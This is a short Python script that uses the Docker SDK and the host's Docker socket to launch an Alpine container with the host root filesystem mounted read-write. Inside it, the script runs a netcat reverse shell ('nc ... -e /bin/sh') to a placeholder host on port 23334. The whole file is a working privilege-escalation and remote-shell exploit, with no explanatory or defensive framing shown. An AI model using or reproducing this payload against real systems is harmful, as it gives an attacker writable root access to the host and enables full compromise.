import docker
client = docker.DockerClient(base_url='unix:///var/run/docker.sock')
data = client.containers.run(
    'alpine:latest',
    r'''sh -c "/usr/bin/nc xxxx 23334 -e /bin/sh" ''',
    remove=True,
    volumes={'/': {'bind': '/tmp/root', 'mode': 'rw'}}
)
print(data)
